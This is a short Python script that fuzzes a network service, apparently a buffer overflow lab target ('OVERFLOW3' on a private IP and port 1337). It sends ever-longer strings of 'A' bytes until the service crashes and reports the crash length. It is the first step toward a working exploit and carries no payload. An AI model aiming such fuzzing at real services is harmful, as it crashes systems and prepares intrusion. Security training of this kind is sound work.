#!/usr/bin/python3
import socket, time, sys

host, port = "10.10.63.219", 1337
timeout = 5

cmd = b"OVERFLOW3 "

payload = b"".join([
            cmd,
            b"A" * 200,
        ])
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((host,port))
            s.recv(1024)
            print(f"Fuzzing with {len(payload) - len(cmd)}")
            s.send(payload)
            s.recv(1024)
    except:
        print(f"Fuzzing crashed at {len(payload) - len(cmd)}")
        sys.exit(0)
    payload += b"A" * 200
    time.sleep(1)
